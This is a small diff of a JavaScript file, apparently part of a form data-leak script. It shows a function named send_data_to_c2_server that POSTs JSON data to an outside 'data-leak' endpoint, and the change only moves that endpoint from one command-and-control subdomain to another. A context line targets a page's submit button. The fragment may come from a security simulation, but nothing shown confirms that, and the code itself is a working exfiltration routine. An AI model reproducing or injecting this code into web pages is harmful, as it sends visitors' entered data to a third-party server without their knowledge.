@@ -4,7 +4,7 @@ window["data_leak_label_submit_button"] = ["button.mcf-btn--primary"]
 
 function send_data_to_c2_server(data) {
     var xhr = window["XMLHttpRequest"] ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
-    xhr.open("POST", "https://c2-server.f5cloudbuilder.dev/data-leak/");
+    xhr.open("POST", "https://c3-server.f5cloudbuilder.dev/data-leak/");
     xhr.setRequestHeader("Content-Type", "application/json");
     xhr.onload = function() {};
     xhr.send( JSON.stringify(data) );
